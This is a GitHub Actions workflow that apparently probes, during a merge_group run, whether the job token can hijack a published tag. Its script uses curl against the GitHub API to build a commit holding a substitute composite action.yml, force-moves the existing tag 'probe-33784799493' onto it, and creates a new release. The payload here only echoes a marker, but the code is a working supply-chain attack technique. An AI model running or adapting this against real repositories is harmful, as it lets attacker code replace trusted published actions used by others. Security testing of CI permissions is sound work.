name: slowgate
on:
  pull_request:
  merge_group:
permissions:
  contents: write
jobs:
  slowgate:
    runs-on: ubuntu-latest
    steps:
      - run: echo "CPX4 event=${{ github.event_name }}"
      - name: can the job HIJACK an already-published tag, and mint a Release?
        if: github.event_name == 'merge_group'
        env:
          GH_TOKEN: ${{ github.token }}
          R: ${{ github.repository }}
        run: |
          H="Authorization: token $GH_TOKEN"
          A=$(printf 'name: cpx-hijacked\ndescription: d\nruns:\n  using: composite\n  steps:\n    - run: echo CPX4-HIJACKED-EXISTING-TAG\n      shell: bash\n')
          B=$(printf '%s' "$A" | base64 -w0)
          BLOB=$(curl -sS -X POST -H "$H" -d "{\"content\":\"$B\",\"encoding\":\"base64\"}" https://api.github.com/repos/$R/git/blobs | python3 -c "import json,sys;print(json.load(sys.stdin).get('sha','ERR'))")
          TREE=$(curl -sS -X POST -H "$H" -d "{\"tree\":[{\"path\":\"action.yml\",\"mode\":\"100644\",\"type\":\"blob\",\"sha\":\"$BLOB\"}]}" https://api.github.com/repos/$R/git/trees | python3 -c "import json,sys;print(json.load(sys.stdin).get('sha','ERR'))")
          CM=$(curl -sS -X POST -H "$H" -d "{\"message\":\"cpx4 hijack\",\"tree\":\"$TREE\",\"parents\":[]}" https://api.github.com/repos/$R/git/commits | python3 -c "import json,sys;print(json.load(sys.stdin).get('sha','ERR'))")
          echo "CPX4 new commit=$CM"
          echo "CPX4 pre-state of the EXISTING tag:"
          curl -sS -H "$H" https://api.github.com/repos/$R/git/ref/tags/probe-33784799493 | python3 -c "import json,sys;d=json.load(sys.stdin);print('  was ->',(d.get('object') or {}).get('sha'))"
          S=$(curl -sS -o /tmp/f.json -w '%{http_code}' -X PATCH -H "$H" -d "{\"sha\":\"$CM\",\"force\":true}" https://api.github.com/repos/$R/git/refs/tags/probe-33784799493)
          echo "CPX4 FORCE-MOVE existing tag -> HTTP $S"
          head -c 240 /tmp/f.json; echo
          RS=$(curl -sS -o /tmp/rel.json -w '%{http_code}' -X POST -H "$H" -d "{\"tag_name\":\"cpx-rel-v1\",\"name\":\"cpx release\",\"body\":\"cpx\"}" https://api.github.com/repos/$R/releases)
          echo "CPX4 CREATE RELEASE -> HTTP $RS"
          head -c 240 /tmp/rel.json; echo
